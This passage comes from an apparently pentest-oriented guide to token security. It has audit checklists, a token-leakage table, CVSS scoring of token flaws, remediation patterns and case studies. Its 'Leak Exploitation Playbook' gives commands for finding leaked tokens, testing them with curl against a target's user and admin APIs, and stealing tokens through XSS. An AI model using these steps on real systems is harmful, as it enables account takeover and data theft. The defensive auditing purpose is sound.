- [ ] Are all claims validated: iss, aud, exp, nbf, iat?
- [ ] Is audience (aud) strictly validated?
- [ ] Is issuer (iss) strictly validated?
- [ ] Is token revocation supported?

### Session Checklist (Expanded)
- [ ] Does session ID change at login (fixation check)?
- [ ] Are session IDs cryptographically random?
- [ ] What's the session entropy (target: 128+ bits)?
- [ ] What's the session expiration (absolute and idle)?
- [ ] Is session invalidated on logout?
- [ ] Is session invalidated on password change?
- [ ] Is session in URL (not cookie)?
- [ ] Are session cookies: Secure? HttpOnly? SameSite=Strict?
- [ ] Can old sessions be reused after logout?
- [ ] Is there concurrent session management?
- [ ] Is session bound to IP/User-Agent (defense in depth)?
- [ ] Can session be predicted (sequential, timestamp)?
- [ ] Is session fixation possible (set session before login)?

### OAuth Checklist (Expanded)
- [ ] Is state parameter required AND validated server-side?
- [ ] Is PKCE required for public clients (SPA, mobile)?
- [ ] Does redirect_uri do exact match (no wildcards)?
- [ ] Is access token in fragment (implicit flow risk)?
- [ ] Are refresh tokens rotated on each use?
- [ ] Is refresh token reuse detected (invalidate old token)?
- [ ] Is token expiration enforced (both access and refresh)?
- [ ] Is token scope minimal (least privilege)?
- [ ] Can authorization code be reused (should be one-time)?
- [ ] Is code verifier validated (PKCE)?
- [ ] Is nonce validated in OIDC implicit flow?
- [ ] Can scope be upgraded during token exchange?
- [ ] Is audience claim validated in ID token?

### API Key Checklist (Expanded)
- [ ] Are API keys in source code / JS bundles?
- [ ] Are keys in environment variables (exposed in client-side JS)?
- [ ] Are keys transmitted in URL (vs header)?
- [ ] Do keys have expiration / rotation policy?
- [ ] Are keys scoped to minimum permissions?
- [ ] Can one user's key access another user's data?
- [ ] Are revoked keys invalidated server-side immediately?
- [ ] Is there rate limiting on API key usage?
- [ ] Are API keys logged (exposure risk)?
- [ ] Are API keys stored hashed (if server-side)?

### Password Reset Checklist (Expanded)
- [ ] Is reset token cryptographically random (128+ bits)?
- [ ] Is token brute-forceable (< 50 bits entropy)?
- [ ] Is token invalidated immediately after use?
- [ ] Does token expire (recommended: < 1 hour)?
- [ ] Is rate limiting on reset request endpoint?
- [ ] Is rate limiting on reset verification endpoint?
- [ ] Does reset require current password for email change?
- [ ] Is reset token tied to specific user account?
- [ ] Is reset token single-use only?
- [ ] Is there notification when reset is requested?
- [ ] Does reset link contain unpredictable token (not user ID)?
- [ ] Is token leaked in Referer header (external resources)?
- [ ] Is token returned in response body (error disclosure)?

---

## Token Leakage Sources (Comprehensive)

### Where Tokens Leak

| Source | Risk Level | Check Method |
|--------|-----------|--------------|
| URL parameter | HIGH | Search for `?token=`, `?access_token=`, `?session=` |
| JavaScript variables | HIGH | grep JS for token storage |
| localStorage | HIGH | Check app JS for localStorage usage |
| sessionStorage | MEDIUM | Check app JS for sessionStorage |
| Error pages | MEDIUM | Trigger errors, check response for tokens |
| Browser console | MEDIUM | Check for console.log(token) |
| Browser history | MEDIUM | Audit all URLs with tokens |
| Mobile app binary | HIGH | Reverse engineer APK/IPA |
| Git history | HIGH | git log --all -S "token" |
| CI/CD logs | HIGH | Check GitHub Actions logs |
| Proxy/server logs | MEDIUM | Check if logs accessible |
| Email (reset links) | MEDIUM | Check if email is secure |
| Screenshots | LOW | Check if tokens visible in screenshots |

### Leak Exploitation Playbook

```
1. Find token in source:
   grep -rn "localStorage.getItem('token')" app.js
   
2. Verify token is live:
   curl -H "Authorization: Bearer $TOKEN" https://target.com/api/user
   
3. Identify token privileges:
   curl -H "Authorization: Bearer $TOKEN" https://target.com/api/admin
   
4. If XSS exists on any page of target.com:
   - Steal token via: document.location.hash / localStorage / cookies
   - Use stolen token to access API as victim
   
5. If token has refresh capability:
   - Refresh token = persistent access
   - Even if access token expires, refresh = new access token
```

---

## CVSS for Token Vulnerabilities (Detailed)

| Vulnerability | AV | AC | PR | UI | S | C | I | A | Score |
|--------------|-----|-----|-----|-----|---|---|---|---|-------|
| JWT none → admin | N | L | N | N | C | H | H | H | 9.8 Critical |
| RS256→HS256 → admin | N | L | N | N | C | H | H | H | 9.8 Critical |
| kid injection → RCE | N | L | N | N | C | H | H | H | 9.8 Critical |
| JWT secret brute → admin | N | L | N | N | C | H | H | H | 9.1 Critical |
| OAuth code theft → ATO | N | L | L | R | C | H | H | L | 9.1 Critical |
| SSRF → IAM creds | N | L | L | N | C | H | H | H | 9.1 Critical |
| Session fixation → ATO | N | L | L | R | U | H | H | L | 7.5 High |
| Refresh token not rotated | N | L | L | N | U | H | H | L | 7.5 High |
| Token in URL | N | L | L | N | U | L | L | N | 5.3 Medium |
| Session prediction | N | L | L | N | U | L | L | N | 5.4 Medium |
| Long session expiry | N | L | L | N | U | L | L | N | 5.3 Medium |

---

## Remediation Patterns (Comprehensive)

### JWT Remediation

```
1. Algorithm validation:
   - Explicitly reject "none" algorithm
   - Validate alg matches expected value
   - Don't allow algorithm switching

2. Strong secrets:
   - HS256: Use 256-bit random secret (not dictionary words)
   - RS256: Keep private key secure, rotate regularly

3. Claim validation:
   - Validate iss (issuer) against allowlist
   - Validate aud (audience) against expected value
   - Validate exp (expiration) — reject if expired
   - Validate nbf (not before) — reject if not yet valid
   - Validate iat (issued at) — reject if from future

4. Short expiration:
   - Access tokens: 15 minutes
   - Refresh tokens: 24 hours with rotation

5. Key rotation:
   - Rotate signing keys regularly
   - Support key ID (kid) for smooth rotation

6. Secure storage:
   - HttpOnly, Secure, SameSite cookies (not localStorage)
   - Never store in URL parameters

7. Library updates:
   - Check CVEs monthly
   - Update JWT library immediately for security fixes
```

### Session Remediation

```
1. Session regeneration:
   - Generate new session ID at login
   - Generate new session ID at privilege escalation
   - Never reuse session IDs

2. Secure generation:
   - Use cryptographically secure random generator
   - Minimum 128 bits entropy
   - Format: base64url-encoded random bytes

3. Expiration:
   - Idle timeout: 2 hours
   - Absolute timeout: 24 hours
   - Remember-me: 30 days max, with re-authentication

4. Invalidation:
   - Invalidate on logout
   - Invalidate on password change
   - Invalidate on email change
   - Support server-side session revocation

5. Cookie security:
   - Secure: HTTPS only
   - HttpOnly: No JavaScript access
   - SameSite=Strict: No cross-site sending
   - Path: Restrict to application path

6. Concurrent sessions:
   - Limit max sessions per user (e.g., 5)
   - Notify user of new logins
   - Allow session revocation
```

### OAuth Remediation

```
1. State parameter:
   - Generate random state per authorization request
   - Validate state on callback
   - Store state in session (not just parameter)

2. PKCE:
   - Required for all public clients
   - Use S256 method (not plain)
   - Validate code_verifier on token exchange

3. Redirect URI:
   - Exact match only (no wildcards, no partial matches)
   - Register allowed URIs at client creation
   - Reject unmatched URIs with error

4. Token handling:
   - Short access token expiry (15-60 min)
   - Refresh token rotation (new token per refresh)
   - Detect and reject reused refresh tokens
   - Store tokens securely (HttpOnly cookies)

5. Scope limitation:
   - Request minimum scope needed
   - Validate requested scope at authorization
   - Don't allow scope escalation

6. Error handling:
   - Don't leak sensitive info in error responses
   - Log authorization attempts for audit
```

---

## Real-World Token Vulnerabilities

### Case Studies

**Case 1: Stateless JWT with No Revocation**
```
Problem: JWT valid for 24 hours, no revocation mechanism
Impact: Stolen JWT valid for 24 hours
Fix: Short access token (15 min) + refresh token with rotation

Case Study: A major social network had 24-hour JWT validity. 
Stolen tokens from XSS were valid for 24 hours. After implementing 
15-min access tokens + refresh rotation, stolen token window reduced 
to 15 minutes.
```

**Case 2: JWT Secret in Client-Side JS**
```
Problem: JWT verification secret hardcoded in client JS
Impact: Attacker reads JS, extracts secret, forges tokens
Fix: Never include secrets in client-side code. Use asymmetric keys.

Case Study: A fintech app had the HMAC secret in app.js. 
Anyone could forge admin tokens. Secret rotated, moved to server-only.
```

**Case 3: OAuth State Not Validated**
```
Problem: OAuth flow missing state parameter validation
Impact: CSRF via OAuth — attacker forces victim to link attacker's account
Fix: Generate random state, store in session, validate on callback

Case Study: An email service had OAuth without state. 
Attackers could link their Google account to victim's account, 
then read victim's emails via their own account.
```

---

## Final Rule

> **Token security is the foundation of application security. A single token vulnerability can bypass every other security control. Always audit tokens first — they're the keys to the entire kingdom.**
